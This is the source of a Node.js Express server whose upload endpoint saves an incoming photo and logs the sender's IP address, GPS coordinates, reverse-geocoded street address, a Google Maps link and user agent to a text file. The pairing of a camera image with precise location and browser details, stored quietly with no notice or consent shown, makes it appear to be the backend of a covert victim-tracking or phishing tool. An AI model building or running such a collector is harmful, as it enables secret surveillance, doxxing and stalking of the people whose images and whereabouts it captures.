const express = require("express");
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");
const cors = require("cors");
const fetch = require("node-fetch");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: "10mb" }));

// Upload directory
const uploadDir = path.join(__dirname, "uploads");
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

app.post("/upload", async (req, res) => {
  const { image, latitude, longitude, userAgent } = req.body;

  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket.remoteAddress;

  if (!image) {
    return res.status(400).json({ error: "No image" });
  }

  // Save image
  const base64Data = image.replace(/^data:image\/\w+;base64,/, "");
  const filename = `photo_${Date.now()}.jpg`;
  fs.writeFileSync(
    path.join(uploadDir, filename),
    Buffer.from(base64Data, "base64")
  );

  // Reverse geocoding
  let address = "Address unavailable";
  if (latitude && longitude) {
    try {
      const geoRes = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`,
        {
          headers: { "User-Agent": "TestApp/1.0 (test@email.com)" }
        }
      );
      const geoData = await geoRes.json();
      address = geoData.display_name || address;
    } catch {}
  }

  const mapsLink = latitude && longitude
    ? `https://www.google.com/maps?q=${latitude},${longitude}`
    : "N/A";

  const log = `
Time: ${new Date().toISOString()}
IP: ${ip}
Latitude: ${latitude}
Longitude: ${longitude}
Address: ${address}
Google Maps: ${mapsLink}
User-Agent: ${userAgent}
Image: ${filename}
----------------------------------
`;
  fs.appendFileSync("log.txt", log);

  res.json({ success: true });
});

app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
